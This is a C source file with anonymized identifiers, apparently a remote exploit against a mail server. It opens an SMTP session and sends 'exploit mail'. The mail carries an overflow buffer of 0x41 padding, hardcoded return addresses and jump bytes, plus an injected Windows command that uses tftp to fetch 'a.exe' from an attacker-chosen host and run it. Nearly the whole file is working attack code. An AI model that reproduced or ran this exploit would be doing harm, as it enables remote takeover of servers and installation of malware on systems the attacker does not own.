
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int tmp ;
typedef int sbuf ;
typedef int buf ;
typedef scalar_t__ SOCKET ;


 scalar_t__ FUNC_0 (char*,int ,int) ;
 int VAR_0 ;
 int FUNC_1 (int) ;
 int FUNC_2 (scalar_t__) ;
 int FUNC_3 (int) ;
 int FUNC_4 (char*,char*,int) ;
 int FUNC_5 (char*,int,int) ;
 scalar_t__ VAR_1 ;
 int FUNC_6 (char*) ;
 int FUNC_7 (scalar_t__,char*,int,int ) ;
 int FUNC_8 (scalar_t__,char*,int,int ) ;
 int FUNC_9 (char*,char*,char*) ;
 int FUNC_10 (char*,char*) ;
 int FUNC_11 (char*,char*) ;
 int FUNC_12 (char*) ;

int FUNC_13( char *VAR_2, char *VAR_3, char *VAR_4, char *VAR_5)
{
    SOCKET VAR_6;
    int VAR_7,VAR_8=0;
    char VAR_9[510], VAR_10[0x10000], VAR_11[500], VAR_12[500];
    VAR_6 = FUNC_0(VAR_4, VAR_0, 10);
    if(VAR_6<0)
    {
        FUNC_6("connect err.\n");
        FUNC_3(1);
    }

    FUNC_5(VAR_9, 0, sizeof(VAR_9));
    VAR_7=FUNC_7(VAR_6, VAR_9, 4096, 0);
    if(VAR_7<=0)
    {
        FUNC_6("recv err.\n");
        FUNC_3(1);
    }
    FUNC_6(VAR_9);

    VAR_7=FUNC_8(VAR_6, "HELO server\r\n",FUNC_12("HELO server\r\n"), 0);
    if(VAR_7<=0)
    {
        FUNC_6("send err.\n");
        FUNC_3(1);
    }
    FUNC_5(VAR_9, 0, sizeof(VAR_9));
    VAR_7=FUNC_7(VAR_6, VAR_9, 4096, 0);
    if(VAR_7<=0)
    {
        FUNC_6("recv err.\n");
        FUNC_3(1);
    }
    FUNC_6(VAR_9);

    VAR_7=FUNC_8(VAR_6, "MAIL FROM: info@sina.com\r\n",FUNC_12("MAIL FROM: info@sina.com\r\n"), 0);
    if(VAR_7<=0)
    {
        FUNC_6("send err.\n");
        FUNC_3(1);
    }
    FUNC_5(VAR_9, 0, sizeof(VAR_9));
    VAR_7=FUNC_7(VAR_6, VAR_9, 4096, 0);
    if(VAR_7<=0)
    {
        FUNC_6("recv err.\n");
        FUNC_3(1);
    }
    FUNC_6(VAR_9);

    FUNC_9(VAR_11, "RCPT TO: %s\r\n", VAR_2);
    VAR_7=FUNC_8(VAR_6, VAR_11,FUNC_12(VAR_11), 0);
    if(VAR_7<=0)
    {
        FUNC_6("send err.\n");
        FUNC_3(1);
    }
    FUNC_5(VAR_9, 0, sizeof(VAR_9));
    VAR_7=FUNC_7(VAR_6, VAR_9, 4096, 0);
    if(VAR_7<=0)
    {
        FUNC_6("recv err.\n");
        FUNC_3(1);
    }
    FUNC_6(VAR_9);
    FUNC_1(1000);

    VAR_7=FUNC_8(VAR_6, "DATA\r\n",FUNC_12("DATA\r\n"), 0);
    if(VAR_7<=0)
    {
        FUNC_6("send err.\n");
        FUNC_3(1);
    }
    FUNC_5(VAR_9, 0, sizeof(VAR_9));
    VAR_7=FUNC_7(VAR_6, VAR_9, 4096, 0);
    if(VAR_7<=0)
    {
        FUNC_6("recv err.\n");
        FUNC_3(1);
    }
    FUNC_6(VAR_9);

    FUNC_6("send exploit mail...\n");
    FUNC_5(VAR_10, 0, sizeof(VAR_10));
    FUNC_5(VAR_9, 0, sizeof(VAR_9));
    FUNC_5(VAR_9, 0x41, sizeof(VAR_9)-1);
    FUNC_5(VAR_11, 0, sizeof(VAR_11));

    FUNC_11(VAR_11, VAR_5);
    FUNC_10(VAR_11, "cmd /c tftp -i %s get a.exe&a.exe:");
    FUNC_9(VAR_12, VAR_11, VAR_3);
    FUNC_4(VAR_9+0x100-FUNC_12(VAR_12), VAR_12, FUNC_12(VAR_12));
    *(int *)(VAR_9+0x100)=0x7ffa54cd;
    *(int *)(VAR_9+0x104)=0x80eb80eb;
    *(int *)(VAR_9+0x108)=0x7ffdf220;
    *(int *)(VAR_9+0x110)=0x7ffdf220;
    FUNC_4(VAR_9, "girl\x0d", 5);
    FUNC_9(VAR_10, (char *)VAR_1, VAR_9);

    VAR_7=FUNC_8(VAR_6, VAR_10,FUNC_12(VAR_10), 0);
    if(VAR_7<=0)
    {
        FUNC_6("send err.\n");
        FUNC_3(1);
    }
    FUNC_5(VAR_9, 0, sizeof(VAR_9));
    VAR_7=FUNC_7(VAR_6, VAR_9, 4096, 0);
    if(VAR_7<=0)
    {
        FUNC_6("recv err.\n");
        FUNC_3(1);
    }
    FUNC_6(VAR_9);
    FUNC_6("exploit mail sent.\n");
    FUNC_2(VAR_6);
    return 0;
}
